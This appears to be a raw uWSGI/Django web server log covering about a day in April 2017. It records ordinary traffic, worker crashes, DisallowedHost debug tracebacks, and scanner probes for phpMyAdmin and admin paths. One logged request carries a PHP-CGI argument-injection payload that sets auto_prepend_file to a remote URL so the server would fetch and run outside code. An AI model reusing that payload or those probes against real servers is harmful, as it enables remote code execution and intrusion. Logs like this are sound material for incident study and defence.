+[pid: 10870|app: 0|req: 18/189] 209.126.136.2 () {32 vars in 468 bytes} [Tue Apr  4 19:28:46 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 21/190] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 19:29:18 2017] GET / => generated 2572 bytes in 81 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 7 (pid: 12470) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 7 (new pid: 21446)
+[pid: 14228|app: 0|req: 22/191] 64.140.169.42 () {34 vars in 457 bytes} [Tue Apr  4 19:43:33 2017] GET / => generated 2572 bytes in 57 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 10870|app: 0|req: 19/192] 64.140.169.42 () {34 vars in 473 bytes} [Tue Apr  4 19:43:33 2017] GET /todolist => generated 3523 bytes in 561 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 6 (pid: 14228) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 21470)
+[pid: 14256|app: 0|req: 20/193] 64.140.169.42 () {34 vars in 465 bytes} [Tue Apr  4 19:43:39 2017] GET /blog => generated 15438 bytes in 4611 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 22/194] 64.140.169.42 () {34 vars in 461 bytes} [Tue Apr  4 19:43:43 2017] GET /10 => generated 0 bytes in 23 msecs (HTTP/1.1 301) 3 headers in 139 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 27/195] 64.140.169.42 () {34 vars in 459 bytes} [Tue Apr  4 19:43:44 2017] GET /9 => generated 0 bytes in 20 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 21470|app: 0|req: 24/196] 64.140.169.42 () {34 vars in 459 bytes} [Tue Apr  4 19:43:44 2017] GET /8 => generated 0 bytes in 66 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 21446|app: 0|req: 21/197] 64.140.169.42 () {34 vars in 459 bytes} [Tue Apr  4 19:43:44 2017] GET /7 => generated 0 bytes in 2098 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 22/198] 64.140.169.42 () {34 vars in 459 bytes} [Tue Apr  4 19:43:46 2017] GET /6 => generated 0 bytes in 20 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+[pid: 10870|app: 0|req: 20/199] 64.140.169.42 () {34 vars in 459 bytes} [Tue Apr  4 19:43:46 2017] GET /5 => generated 0 bytes in 9 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+DAMN ! worker 9 (pid: 14256) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 9 (new pid: 21471)
+[pid: 17974|app: 0|req: 23/200] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 20:30:26 2017] GET / => generated 2572 bytes in 73 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 3 (pid: 10870) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 3 (new pid: 21804)
+[pid: 21186|app: 0|req: 17/201] 111.193.213.142 () {44 vars in 794 bytes} [Tue Apr  4 21:03:53 2017] GET / => generated 2572 bytes in 142 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 21804|app: 0|req: 21/202] 111.193.213.142 () {44 vars in 877 bytes} [Tue Apr  4 21:03:54 2017] GET /favicon.ico => generated 2819 bytes in 78 msecs (HTTP/1.1 404) 2 headers in 80 bytes (2 switches on core 0)
+[pid: 21186|app: 0|req: 18/203] 185.134.30.28 () {46 vars in 950 bytes} [Tue Apr  4 21:23:29 2017] GET /todolist => generated 3523 bytes in 564 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+DAMN ! worker 4 (pid: 21186) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 4 (new pid: 22010)
+Tue Apr  4 21:23:42 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /blog (ip 185.134.30.28) !!!
+Tue Apr  4 21:23:42 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET /blog (185.134.30.28)
+OSError: write error
+[pid: 21470|app: 0|req: 25/204] 185.134.30.28 () {46 vars in 950 bytes} [Tue Apr  4 21:23:36 2017] GET /blog => generated 0 bytes in 5840 msecs (HTTP/1.1 200) 2 headers in 0 bytes (0 switches on core 0)
+[pid: 21471|app: 0|req: 21/205] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 22:20:02 2017] GET / => generated 2572 bytes in 1946 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 6 (pid: 21470) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 22335)
+[pid: 17978|app: 0|req: 26/206] 210.186.153.24 () {26 vars in 281 bytes} [Tue Apr  4 23:12:45 2017] GET / => generated 2572 bytes in 45 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14868|app: 0|req: 20/207] 178.154.200.30 () {34 vars in 477 bytes} [Tue Apr  4 23:29:02 2017] GET /robots.txt => generated 2816 bytes in 46 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 22335|app: 0|req: 26/208] 178.154.200.30 () {38 vars in 513 bytes} [Tue Apr  4 23:29:06 2017] GET /7 => generated 0 bytes in 76 msecs (HTTP/1.1 301) 3 headers in 138 bytes (1 switches on core 0)
+DAMN ! worker 4 (pid: 22010) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 4 (new pid: 22735)
+[pid: 17978|app: 0|req: 27/209] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 23:33:14 2017] GET / => generated 2572 bytes in 41 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 24/210] 207.46.13.78 () {42 vars in 570 bytes} [Wed Apr  5 00:13:41 2017] GET / => generated 2572 bytes in 59 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 21471|app: 0|req: 22/211] 123.125.71.36 () {40 vars in 544 bytes} [Wed Apr  5 00:45:24 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 28/212] 31.210.102.114 () {30 vars in 377 bytes} [Wed Apr  5 01:06:28 2017] GET / => generated 2572 bytes in 61 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 23/213] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 01:12:05 2017] GET / => generated 2572 bytes in 50 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 21804|app: 0|req: 22/214] 61.135.169.40 () {32 vars in 470 bytes} [Wed Apr  5 01:28:40 2017] GET / => generated 2572 bytes in 89 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 25/215] 58.218.205.84 () {34 vars in 507 bytes} [Wed Apr  5 01:30:57 2017] GET /manager/html => generated 2825 bytes in 46 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 14868|app: 0|req: 21/216] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 02:46:48 2017] GET / => generated 2572 bytes in 50 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.xyc55.com'. You may need to add 'www.xyc55.com' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.xyc55.com'. You may need to add 'www.xyc55.com' to ALLOWED_HOSTS.
+[pid: 14868|app: 0|req: 22/217] 104.148.75.19 () {32 vars in 495 bytes} [Wed Apr  5 02:54:33 2017] GET / => generated 0 bytes in 89 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 21446|app: 0|req: 22/218] 180.149.130.19 () {38 vars in 623 bytes} [Wed Apr  5 03:12:57 2017] GET / => generated 2572 bytes in 110 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 24/219] 207.46.13.87 () {42 vars in 570 bytes} [Wed Apr  5 03:14:25 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 29/220] 209.126.119.35 () {36 vars in 484 bytes} [Wed Apr  5 03:19:09 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 26/221] 220.181.51.88 () {38 vars in 560 bytes} [Wed Apr  5 03:23:39 2017] GET /robots.txt => generated 2816 bytes in 38 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 21446|app: 0|req: 23/222] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 04:03:35 2017] GET / => generated 2572 bytes in 47 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'xyc01.com'. You may need to add 'xyc01.com' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'xyc01.com'. You may need to add 'xyc01.com' to ALLOWED_HOSTS.
+[pid: 21471|app: 0|req: 23/223] 23.247.88.59 () {32 vars in 490 bytes} [Wed Apr  5 04:56:27 2017] GET / => generated 0 bytes in 342 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 9912|app: 0|req: 28/224] 66.249.79.148 () {36 vars in 521 bytes} [Wed Apr  5 05:27:39 2017] GET /robots.txt => generated 2816 bytes in 42 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 14868|app: 0|req: 23/225] 66.249.79.152 () {38 vars in 709 bytes} [Wed Apr  5 05:27:39 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 25/226] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 05:46:27 2017] GET / => generated 2572 bytes in 47 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 26/227] 104.131.23.12 () {38 vars in 575 bytes} [Wed Apr  5 06:54:45 2017] GET /robots.txt => generated 2816 bytes in 39 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 14868|app: 0|req: 24/228] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 07:07:24 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 5 (pid: 14868) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 5 (new pid: 26058)
+[pid: 17974|app: 0|req: 27/229] 221.2.242.137 () {36 vars in 488 bytes} [Wed Apr  5 08:05:56 2017] GET /manager/html => generated 2822 bytes in 31 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+DAMN ! worker 1 (pid: 9035) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 1 (new pid: 26192)
+[pid: 26058|app: 0|req: 25/230] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 08:35:31 2017] GET / => generated 2572 bytes in 144 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 30/231] 220.181.108.102 () {40 vars in 546 bytes} [Wed Apr  5 08:37:46 2017] GET / => generated 2572 bytes in 40 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+[pid: 26192|app: 0|req: 27/232] 91.196.50.33 () {38 vars in 619 bytes} [Wed Apr  5 08:38:16 2017] GET /testproxy.php => generated 0 bytes in 291 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 21446|app: 0|req: 24/233] 123.125.67.163 () {38 vars in 561 bytes} [Wed Apr  5 08:48:08 2017] GET /robots.txt => generated 2816 bytes in 45 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 29/234] 66.249.79.148 () {38 vars in 709 bytes} [Wed Apr  5 08:55:44 2017] GET / => generated 2572 bytes in 59 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 28/235] 139.162.119.197 () {32 vars in 462 bytes} [Wed Apr  5 09:39:56 2017] GET / => generated 2572 bytes in 41 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 31/236] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 09:55:29 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 30/237] 5.9.156.154 () {34 vars in 384 bytes} [Wed Apr  5 11:02:31 2017] GET / => generated 2572 bytes in 41 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 29/238] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 11:30:30 2017] GET / => generated 2572 bytes in 58 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 30/239] 201.105.136.226 () {34 vars in 422 bytes} [Wed Apr  5 12:22:02 2017] HEAD /mysql/admin/ => generated 0 bytes in 45 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 28/240] 201.105.136.226 () {34 vars in 426 bytes} [Wed Apr  5 12:22:02 2017] HEAD /mysql/dbadmin/ => generated 0 bytes in 79 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26058|app: 0|req: 26/241] 201.105.136.226 () {34 vars in 432 bytes} [Wed Apr  5 12:22:02 2017] HEAD /mysql/sqlmanager/ => generated 0 bytes in 19 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 29/242] 201.105.136.226 () {34 vars in 436 bytes} [Wed Apr  5 12:22:02 2017] HEAD /mysql/mysqlmanager/ => generated 0 bytes in 10 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26058|app: 0|req: 27/243] 201.105.136.226 () {34 vars in 420 bytes} [Wed Apr  5 12:22:03 2017] HEAD /phpmyadmin/ => generated 0 bytes in 7 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 30/244] 201.105.136.226 () {34 vars in 420 bytes} [Wed Apr  5 12:22:03 2017] HEAD /phpMyadmin/ => generated 0 bytes in 6 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 22735|app: 0|req: 20/245] 201.105.136.226 () {34 vars in 420 bytes} [Wed Apr  5 12:22:03 2017] HEAD /phpMyAdmin/ => generated 0 bytes in 152 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 22335|app: 0|req: 27/246] 201.105.136.226 () {34 vars in 420 bytes} [Wed Apr  5 12:22:03 2017] HEAD /phpmyAdmin/ => generated 0 bytes in 79 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 31/247] 201.105.136.226 () {34 vars in 422 bytes} [Wed Apr  5 12:22:04 2017] HEAD /phpmyadmin2/ => generated 0 bytes in 32 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26058|app: 0|req: 28/248] 201.105.136.226 () {34 vars in 422 bytes} [Wed Apr  5 12:22:04 2017] HEAD /phpmyadmin3/ => generated 0 bytes in 19 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 31/249] 201.105.136.226 () {34 vars in 422 bytes} [Wed Apr  5 12:22:04 2017] HEAD /phpmyadmin4/ => generated 0 bytes in 40 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 32/250] 201.105.136.226 () {34 vars in 422 bytes} [Wed Apr  5 12:22:04 2017] HEAD /2phpmyadmin/ => generated 0 bytes in 48 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 31/251] 201.105.136.226 () {34 vars in 410 bytes} [Wed Apr  5 12:22:05 2017] HEAD /phpmy/ => generated 0 bytes in 44 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 32/252] 201.105.136.226 () {34 vars in 412 bytes} [Wed Apr  5 12:22:05 2017] HEAD /phppma/ => generated 0 bytes in 34 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 21446|app: 0|req: 25/253] 201.105.136.226 () {34 vars in 414 bytes} [Wed Apr  5 12:22:05 2017] HEAD /myadmin/ => generated 0 bytes in 33 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 21471|app: 0|req: 24/254] 201.105.136.226 () {34 vars in 412 bytes} [Wed Apr  5 12:22:05 2017] HEAD /shopdb/ => generated 0 bytes in 46 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 32/255] 201.105.136.226 () {34 vars in 414 bytes} [Wed Apr  5 12:22:06 2017] HEAD /MyAdmin/ => generated 0 bytes in 24 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26058|app: 0|req: 29/256] 201.105.136.226 () {34 vars in 414 bytes} [Wed Apr  5 12:22:06 2017] HEAD /program/ => generated 0 bytes in 13 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 32/257] 201.105.136.226 () {34 vars in 406 bytes} [Wed Apr  5 12:22:06 2017] HEAD /PMA/ => generated 0 bytes in 33 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 33/258] 201.105.136.226 () {34 vars in 414 bytes} [Wed Apr  5 12:22:06 2017] HEAD /dbadmin/ => generated 0 bytes in 32 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 33/259] 201.105.136.226 () {34 vars in 406 bytes} [Wed Apr  5 12:22:07 2017] HEAD /pma/ => generated 0 bytes in 21 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 33/260] 201.105.136.226 () {34 vars in 404 bytes} [Wed Apr  5 12:22:07 2017] HEAD /db/ => generated 0 bytes in 25 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 21446|app: 0|req: 26/261] 201.105.136.226 () {34 vars in 410 bytes} [Wed Apr  5 12:22:07 2017] HEAD /admin/ => generated 0 bytes in 61 msecs (HTTP/1.1 302) 7 headers in 312 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 34/262] 201.105.136.226 () {34 vars in 410 bytes} [Wed Apr  5 12:22:07 2017] HEAD /mysql/ => generated 0 bytes in 31 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 21446|app: 0|req: 27/263] 201.105.136.226 () {34 vars in 416 bytes} [Wed Apr  5 12:22:08 2017] HEAD /database/ => generated 0 bytes in 29 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+DAMN ! worker 9 (pid: 21471) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 9 (new pid: 28650)
+[pid: 9912|app: 0|req: 35/264] 83.7.17.116 () {26 vars in 279 bytes} [Wed Apr  5 12:48:29 2017] GET / => generated 2572 bytes in 56 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 34/265] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 13:05:51 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 22735|app: 0|req: 21/266] 191.96.249.97 () {28 vars in 844 bytes} [Wed Apr  5 13:27:01 2017] GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n => generated 3081 bytes in 48 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 26192|app: 0|req: 34/267] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 14:33:33 2017] GET / => generated 2572 bytes in 64 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 22335|app: 0|req: 28/268] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 16:06:12 2017] GET / => generated 2572 bytes in 87 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 21804|app: 0|req: 23/269] 220.181.108.107 () {40 vars in 546 bytes} [Wed Apr  5 17:08:17 2017] GET / => generated 2572 bytes in 46 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 36/270] 185.169.230.8 () {28 vars in 305 bytes} [Wed Apr  5 17:25:34 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 1 (pid: 26192) died, killed by signal 9 :( trying respawn ...
